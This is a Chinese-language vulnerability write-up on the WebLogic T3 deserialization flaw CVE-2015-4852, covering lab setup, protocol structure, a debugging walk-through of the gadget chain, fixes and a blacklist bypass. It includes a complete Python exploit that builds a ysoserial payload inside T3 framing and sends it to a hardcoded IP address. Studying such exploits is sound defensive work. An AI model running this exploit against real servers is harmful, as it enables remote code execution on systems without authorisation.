---
title: Weblogic T3 反序列化分析
date: 2026-10-09
---

# Weblogic T3 反序列化分析

## 环境搭建

建议使用本地搭建，环境的安装用[QAX-A-Team/WeblogicEnvironment: Weblogic环境搭建工具](https://github.com/QAX-A-Team/WeblogicEnvironment)这个脚本，可以省去很多麻烦。JDK6u25、JDK7u21、JDK8u121 建议都安装一下，Weblogic 10.3.6 版本在官网上好像找不到了，建议在网上找一下别人的网盘链接啥的。

环境就放到 kali 中搭建好了，安装一下 docker 然后配置一下镜像源什么的。

Dockerfile 要修改一下：

```dockerfile
# 基础镜像
FROM centos:centos7
# 参数
ARG JDK_PKG
ARG WEBLOGIC_JAR
# 解决libnsl包丢失的问题
# RUN yum -y install libnsl

# 创建用户
RUN groupadd -g 1000 oinstall && useradd -u 1100 -g oinstall oracle
# 创建需要的文件夹和环境变量
RUN mkdir -p /install && mkdir -p /scripts
ENV JDK_PKG=$JDK_PKG
ENV WEBLOGIC_JAR=$WEBLOGIC_JAR

# 复制脚本
COPY scripts/jdk_install.sh /scripts/jdk_install.sh 
COPY scripts/jdk_bin_install.sh /scripts/jdk_bin_install.sh 

COPY scripts/weblogic_install11g.sh /scripts/weblogic_install11g.sh
COPY scripts/weblogic_install12c.sh /scripts/weblogic_install12c.sh
COPY scripts/create_domain11g.sh /scripts/create_domain11g.sh
COPY scripts/create_domain12c.sh /scripts/create_domain12c.sh
COPY scripts/open_debug_mode.sh /scripts/open_debug_mode.sh
COPY jdks/$JDK_PKG .
COPY weblogics/$WEBLOGIC_JAR .

# 判断jdk是包（bin/tar.gz）weblogic包（11g/12c）载入对应脚本
RUN if [ $JDK_PKG == *.bin ] ; then echo ****载入JDK bin安装脚本**** && cp /scripts/jdk_bin_install.sh /scripts/jdk_install.sh ; else echo ****载入JDK tar.gz安装脚本**** ; fi
RUN if [ $WEBLOGIC_JAR == *1036* ] ; then echo ****载入11g安装脚本**** && cp /scripts/weblogic_install11g.sh /scripts/weblogic_install.sh && cp /scripts/create_domain11g.sh /scripts/create_domain.sh ; else echo ****载入12c安装脚本**** && cp /scripts/weblogic_install12c.sh /scripts/weblogic_install.sh && cp /scripts/create_domain12c.sh /scripts/create_domain.sh  ; fi

# 脚本设置权限及运行
RUN chmod +x /scripts/jdk_install.sh
RUN chmod +x /scripts/weblogic_install.sh
RUN chmod +x /scripts/create_domain.sh
RUN chmod +x /scripts/open_debug_mode.sh
# 安装JDK
RUN /scripts/jdk_install.sh
# 安装weblogic
RUN /scripts/weblogic_install.sh
# 创建Weblogic Domain
RUN /scripts/create_domain.sh
# 打开Debug模式
RUN /scripts/open_debug_mode.sh
# 启动 Weblogic Server
# CMD ["tail","-f","/dev/null"]
CMD ["/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh"]
EXPOSE 7001
```

然后启动环境：

```bash
sudo docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .

sudo docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
```

## 基础知识

### 关于 Weblogic

Weblogic 是 Oracle 开发的一个 Java 应用服务器，我们可以理解为运行企业级 Java 应用程序的“基础平台”或“引擎”。

Weblogic 的核心作用就是为复杂的 Java 程序提供一个兼顾、安全且可扩展的运行环境。开发者用 Java EE 标准技术（比如 Servlet、JSP、EJB、JMS）写好的业务系统，最终都会打包部署到 Weblogic 上跑，对外提供服务。

Weblogic 和 Tomcat 的基础作用是一样的，都是用来运行 Java Web 应用的服务器，但是 Tomcat 是一个轻量级的“ Web 容器”，而 Weblogic 是一个完整的企业级“应用服务器”。Tomcat 主要实现 Java EE 中的 **Servlet、JSP** 等 Web 层规范，本质是一个 **Web 容器**。它擅长处理 HTTP 请求，适合跑普通的 Web 应用。而 Weblogic 完整实现了**整个 Java EE 规范**，除了 Web 层，还包含 EJB、JMS、JTA（事务）、JPA 等企业能力，是个**完整的应用服务器**。

所以 Weblogic 可以自己部署很多东西，但是在 Tomcat 中就需要自己写代码。

### T3 协议

T3 协议是 Weblogic 内独有的一个协议，主要用来在 Weblogic Server 和 Java 程序（包括客户端、其他 Weblogic 实例）之间高效地传输数据。

**核心作用是为 Java 程序打造高效的 RMI 通道。**

在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。

T3 协议中包含请求包头和请求主体这两部分内容。

这里拿 CVE-2015-4852 的 EXP 来讲解。EXP 如下：

```python
import socket
import sys
import struct
import re
import subprocess
import binascii

def get_payload1(gadget, command):
    JAR_FILE = '.\ysoserial.jar'
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)
    return popen.stdout.read()

def get_payload2(path):
    with open(path, "rb") as f:
        return f.read()

def exp(host, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n".encode()
    sock.sendall(handshake)
    data = sock.recv(1024)
    pattern = re.compile(r"HELO:(.*).false")
    version = re.findall(pattern, data.decode())
    if len(version) == 0:
        print("Not Weblogic")
        return

    print("Weblogic {}".format(version[0]))
    data_len = binascii.a2b_hex(b"00000000") #数据包长度，先占位，后面会根据实际情况重新
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006") #t3协议头
    flag = binascii.a2b_hex(b"fe010000") #反序列化数据标志
    payload = data_len + t3header + flag + payload
    payload = struct.pack('>I', len(payload)) + payload[4:] #重新计算数据包长度
    sock.send(payload)

if __name__ == "__main__":
    host = "81.68.120.14"
    port = 7001
    gadget = "Jdk7u21" #CommonsCollections1 Jdk7u21
    command = "Calc"

    payload = get_payload1(gadget, command)
    exp(host, port, payload)
```

这个脚本直接运行是不行的，会回显 Not Weblogic，因为 python socket 如果频繁发包，会被服务端所拒绝，所以需要以 debug 模式运行。或者可以在发送完握手包之后用`sleep`暂停一下。

#### Weblogic 请求包头

我们通过 WireShark 对这个流量包进行抓包，可以看到请求头：

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/WiresharkPack.png)

```t3
t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001
```

这就是请求包的头。在发送请求包头后，服务端 Weblogic 会有一个响应：

```t3
HELO:10.3.6.0.false
AS:2048
HL:19
```

HELO 后面的内容则是被攻击方的 Weblogic 版本号，也就是说，在发送正确的请求包头后，服务端会进行一个返回 Weblogic 版本号的操作。

#### Weblogic 请求主体

请求主题，也就是发送的数据，这些数据分为七部分内容：

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/T3SevenParts.png)

第一个非 Java 序列化数据，也就是我们的请求头：`t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001`。而后面的第 n 部分的数据，其实是不限制的，也就是说我们可以只有一部分的 Java 序列化数据，也可以有七部分的 Java 序列化数据，这并不重要，我们可以看一下抓到的包：

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/SerializeData.png)

在`ac ed 00 05`之后的内容就是序列化的数据，所以如果我们要进行攻击，应该是对于这一串序列化的数据进行恶意构造，让服务端在反序列化的时候发起攻击。而在此处，如果有多个 Java 序列化的数据，我们可以对任意一个数据进行攻击。

## 漏洞分析与调试

### 影响版本

Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3。

### 尾部漏洞点

这个毕竟是反序列化的漏洞，一般会从两个点入手：

1. 是否存在 JNDI 注入
2. 是否有能够命令执行的利用点

#### JNDI 注入的尾部探索

这里由于我没有完整地导入这里需要的包，就放别的大佬的踩坑过程了。原文在[CVE-2015-4852 WebLogic T3 反序列化分析 | Drunkbaby's Blog](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-反序列化分析/#Jndi-注入的链尾探索)。

### 漏洞分析

我们在 docker 容器中运行`find / -iname "*commons*collections*" 2>/dev/null`命令，可以找到 Weblogic 的包里有 Commons Collections 3.2.0 的包。

所以我们就已经有了链尾，需要寻找一个合适的入口类。在别人的研究之后发现反序列化的入口类是在`InboundMsgAbbrev#readObject`处，下一个断点开始调试。

Weblogic T3 对于 RMI 传递过来的数据在处理上还是比较绕的，不过有了上面的图理解起来还是比较容易的。

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/InboundMsgAbbrevReadObject.png)

先跟进到`ServerChannelInputStream`的构造函数中，`ServerChannelInputStream`这个类的作用是处理服务端收到的请求头信息。

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/ServerChannelInputStream.png)

继续跟进到`getServerChannel()`方法中：

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/getServerChannel.png)

关注一下这里的`this.connection`是什么。

`connection`是`weblogic.rjvm.t3.MuxableSocketT3$T3MsgAbbrevJVMConnection@49be5302`这个类，在`this.connection`中主要存储一些 RMI 连接的数据，包括端口地址等。跟进到`getChannel()`方法，开始处理 T3 协议：

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/getChannel.png)

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/getServerChannelValue.png)

T3 头处理结束，重新回到`InboundMsgAbbrev#readObject`处，跟进`readObject()`方法。一路跟进至`InboundMsgAbbrev#resolveClass()`中，这里调用栈如下：

```java
resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)
readNonProxyDesc:1610, ObjectInputStream (java.io)
readClassDesc:1515, ObjectInputStream (java.io)
readOrdinaryObject:1769, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
```

`resolveClass()`是用来处理类的，这些类在经过反序列化之后会走到`resolveClass()`方法这里，此时的`var1`，就是我们的`AnnotationInvocationHandler`类。

![T3serial](/images/screenshots/T3serial.png)

这时候的`AnnotationInvocationHandler`类不会被直接拿去反序列化，因为 Weblogic 服务端需要先加载所有反序列化的内容，在将这些数据反序列化解析完毕之后（也说只是做了`Class.forName()`的操作之后），才会开始进行真正的反序列化。

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/entrySet.png)

然后就是基本的 CC1 的环节。

### POC 理解

POC 的本质就是把 ysoserial 生成的 payload 变成 T3 协议中的数据格式，我们需要写入几样东西：

1. Header：这代表数据包的长度
2. T3 Header
3. 反序列化标志：也就是`fe 01 00 00`

所以 POC 中有三段代码：

```python
header = binascii.a2b_hex(b"00000000")
t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
desflag = binascii.a2b_hex(b"fe010000")
```

## 漏洞修复

### 在 resolveClass() 处打补丁

在前面的分析中我们是可以发现加载类其实是通过调用`resolveClass()`方法，再通过反射获取到任意类的，所以官方选择了基于`resolveClass()`去做黑名单过滤。

如果在`resolveClass()`处加一个过滤，在`readNonProxyDesc`调用完`resolveClass()`方法后，后面的反序列化操作无法完成。

### 通过 Web 代理与 Nginx 等负载均衡防御

Web 代理的方式只能转发 HTTP 的请求，而不会转发 T3 协议的请求，这就能防御 T3 漏洞的攻击，但是这对于业务会有很大影响。同理负载均衡也是，不过负载均衡需要自己手动设置。

### 黑名单 Bypass

Oracle 官方对于 CVE-2015-4852 的修复是通过黑名单限制的。

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/BlackList.png)

绕过思路：

![1](https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/bypass.png)

其实就是由 `ServerChannelInputStream` 换到了自身的 `ReadExternal#InputStream`，这一个 bypass 也被收录为 CVE-2016-0638。

## 总结

从原理角度上来说还是比较简单的，不过理解 T3 的传输，并且构造恶意 PoC 的过程是非常值得学习的，CVE-2015-4852 为一些类似的攻击提供了思路。























